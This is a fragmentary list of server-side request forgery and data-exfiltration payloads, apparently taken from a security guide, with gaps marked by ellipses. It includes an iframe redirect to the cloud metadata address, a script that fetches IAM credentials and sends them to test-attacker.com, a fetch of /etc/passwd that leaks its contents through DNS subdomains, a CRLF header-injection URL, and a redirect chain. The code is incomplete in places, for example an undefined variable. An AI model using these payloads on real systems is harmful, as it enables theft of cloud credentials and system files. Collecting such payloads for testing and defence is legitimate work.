...
<iframe src="http://test-attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/"></iframe>
...
<link rel="dns-prefetch" href="//data.test-attacker.com">
```
...
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(t => {
    new Image().src = 'http://test-attacker.com/exfil?data=' + btoa(t);
  });
</script>
...
fetch('file:///etc/passwd')
  ...
  .then(t => {
    ...
    var img = new Image();
    img.src = 'http://' + encoded + '.test-attacker.com/';
  });
</script>
```
...
```
http://test-attacker.com/%0D%0AHost:%20169.254.169.254%0D%0A
```
...
```
https://test-attacker.com/redirect → 302 → http://169.254.169.254/
```
